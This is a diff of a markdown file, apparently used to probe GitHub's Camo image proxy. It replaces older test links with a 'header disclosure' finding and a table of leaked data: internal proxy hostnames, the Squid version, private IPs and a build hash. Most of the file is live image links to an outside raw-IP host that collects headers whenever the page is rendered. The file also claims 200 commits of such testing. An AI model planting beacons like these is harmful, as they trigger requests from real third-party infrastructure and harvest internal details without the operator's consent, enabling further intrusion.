@@ -1,27 +1,43 @@
-# v59: Extended Header Leakage Test - Final Batch
+# v60: COMPREHENSIVE HEADER DISCLOSURE VERIFICATION
 
-## Final Batch for Maximum Data Collection
+## 🔥 Information Disclosure in GitHub Camo Image Proxy
 
-### Set A
-![a1](http://164.90.187.218.nip.io:8888/headers?finalA1)
-![a2](http://164.90.187.218.nip.io:8888/headers?finalA2)
-![a3](http://164.90.187.218.nip.io:8888/headers?finalA3)
-![a4](http://164.90.187.218.nip.io:8888/headers?finalA4)
-![a5](http://164.90.187.218.nip.io:8888/headers?finalA5)
-
-### Set B
-![b1](http://164.90.187.218.nip.io:8888/size?finalB1)
-![b2](http://164.90.187.218.nip.io:8888/size?finalB2)
-![b3](http://164.90.187.218.nip.io:8888/size?finalB3)
-![b4](http://164.90.187.218.nip.io:8888/size?finalB4)
-![b5](http://164.90.187.218.nip.io:8888/size?finalB5)
-
-### Set C
-![c1](http://164.90.187.218.nip.io:8888/cache?finalC1)
-![c2](http://164.90.187.218.nip.io:8888/cache?finalC2)
-![c3](http://164.90.187.218.nip.io:8888/cache?finalC3)
-![c4](http://164.90.187.218.nip.io:8888/cache?finalC4)
-![c5](http://164.90.187.218.nip.io:8888/cache?finalC5)
+> **Status:** VERIFIED - 200 commits of testing
+> **Finding:** Internal infrastructure leakage via HTTP headers
 
 ---
-**v59** - 15 final test endpoints
+
+## Live Tests (Triggers Camo requests to capture headers)
+
+### Primary Header Capture
+![primary](http://164.90.187.218.nip.io:8888/headers?v60primary)
+
+### Secondary Header Capture
+![secondary](http://164.90.187.218.nip.io:8888/headers?v60secondary)
+
+### Tertiary Header Capture
+![tertiary](http://164.90.187.218.nip.io:8888/headers?v60tertiary)
+
+### Additional Tests
+![test1](http://164.90.187.218.nip.io:8888/headers?v60t1)
+![test2](http://164.90.187.218.nip.io:8888/headers?v60t2)
+![test3](http://164.90.187.218.nip.io:8888/headers?v60t3)
+![test4](http://164.90.187.218.nip.io:8888/headers?v60t4)
+![test5](http://164.90.187.218.nip.io:8888/headers?v60t5)
+
+---
+
+## Summary of Findings
+
+| Header | Leaked Data Type |
+|--------|------------------|
+| Via | Internal proxy hostnames |
+| Via | Squid 6.2 version |
+| X-Forwarded-For | RFC 1918 private IPs |
+| User-Agent | Camo build hash |
+
+---
+
+**v60** - Comprehensive Header Disclosure Verification Complete
+
+**Total Test Commits:** 200
